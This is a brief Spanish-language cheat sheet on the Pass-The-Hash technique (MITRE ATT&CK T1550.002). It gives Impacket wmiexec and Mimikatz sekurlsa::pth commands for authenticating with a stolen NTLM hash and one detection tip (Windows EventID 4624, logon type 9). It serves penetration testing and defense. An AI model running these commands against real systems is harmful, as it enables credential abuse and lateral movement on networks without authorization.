# 🔄 Pass-The-Hash (MITRE ATT&CK T1550.002)

## 🛠 Herramientas
| Herramienta | Comando |
|-------------|---------|
| **Impacket** | `python3 wmiexec.py -hashes :NTLM_HASH user@target` |
| **Mimikatz** | `sekurlsa::pth /user:admin /domain:corp /ntlm:HASH` |

## 🎯 Detección
- Monitorear eventos Windows `EventID 4624` (logon tipo 9).
